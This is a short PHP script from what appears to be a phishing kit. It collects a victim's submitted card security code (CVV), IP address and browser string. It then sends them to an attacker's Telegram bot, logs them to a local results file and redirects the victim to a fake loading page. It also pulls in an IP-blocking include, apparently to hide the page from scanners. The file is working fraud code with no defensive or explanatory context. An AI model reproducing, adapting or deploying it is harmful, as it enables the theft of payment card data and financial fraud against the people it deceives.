<?php
include './config.php';
include '../Files/IpBlocker.php';

$zabi = getenv("REMOTE_ADDR");
$message .= "[]-----------------<[ CVV ES ]>-----------------[]\n";
$message .= "Cvv : ".$_POST['sms']."\n";
$message .= "<>-------------------< IP Infos >-----------------<>\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "[]-----------------< PAYL01D IS BACK >-----------------[]\n";
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
    $text = fopen('../rzlt.txt', 'a');
fwrite($text, $message);
header("Location: ../Pages/loading2.php");

?>
